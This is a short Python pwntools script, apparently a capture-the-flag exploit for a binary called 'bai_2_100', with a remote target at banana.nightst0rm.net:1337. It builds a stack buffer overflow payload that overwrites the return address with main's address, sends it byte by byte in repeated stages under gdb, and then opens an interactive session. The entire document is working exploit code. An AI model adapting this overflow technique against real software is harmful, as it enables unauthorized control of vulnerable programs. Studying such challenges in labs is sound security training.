from pwn import *
import struct
context(os='linux', arch='i386')

def getConn():
    return process('./bai_2_100') if local else remote('banana.nightst0rm.net', 1337)
local = True
r = getConn()
gdb.attach(r, '''

break *0x804853D
c
''')
#break *0x0804862b
#break *0x804865f
#0x804A03C
main=		'\x80\x86\x04\x08'
pl='A'*(40+4)+main
pl2='B'*(72)
def pwn():
	for i in range(len(pl)):
		r.send(pl[i])
	r.send('\x00')
	print r.recv()
	for i in range(len(pl2)):
		r.send(pl2[i])
	r.send('\x00')
for i in range(5):
	print 'stage',i
	pwn()
	sleep(0.2)
r.interactive()
r.close()
